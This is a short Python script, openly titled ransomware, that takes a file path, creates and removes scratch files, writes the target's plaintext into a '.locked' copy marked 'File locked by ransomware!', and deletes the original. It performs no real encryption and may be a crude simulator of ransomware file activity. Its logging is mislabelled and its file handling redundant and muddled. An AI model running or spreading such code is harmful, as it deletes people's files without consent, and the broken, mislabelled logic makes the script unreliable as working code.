import sys
import os
import shutil

def ransomware(file_path):
    # Get the directory and filename
    directory = os.path.dirname(file_path)
    filename = os.path.basename(file_path)

    
    # Open file x
    print("Created file x")
    x_path = os.path.join(directory, 'x')
    with open(x_path, 'w') as x_file:
        print("Opened file x")
        file_content = x_file.write('This is the x file')
        print("Modified file x")
    
    # Close file target
    print("Closed file target")
    x_file.close()
    
    # Create file c
    print("Created file x")
    c_path = os.path.join(directory, 'c')
    with open(c_path, 'w') as c_file:
        print("Opened file c")
        file_content = c_file.write('This is the c file')
        print("Modified file c")

    # Open the original file
    with open(file_path, 'r') as original_file:
        # Read the content of the original file
        file_content = original_file.read()

        os.remove(c_path)

        # Create a locked file
        locked_file_path = os.path.join(directory, filename + '.locked')
        with open(locked_file_path, 'w') as locked_file:
            # Store the content of the original file in the locked file
            locked_file.write(file_content)
            locked_file.write('\nFile locked by ransomware!')
        with open(x_path, 'w') as x_file:
            print("Opened file x")

    # Delete the original file
    os.remove(file_path)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ransomware.py <file_path>")
        sys.exit(1)

    file_path = sys.argv[1]
    ransomware(file_path)
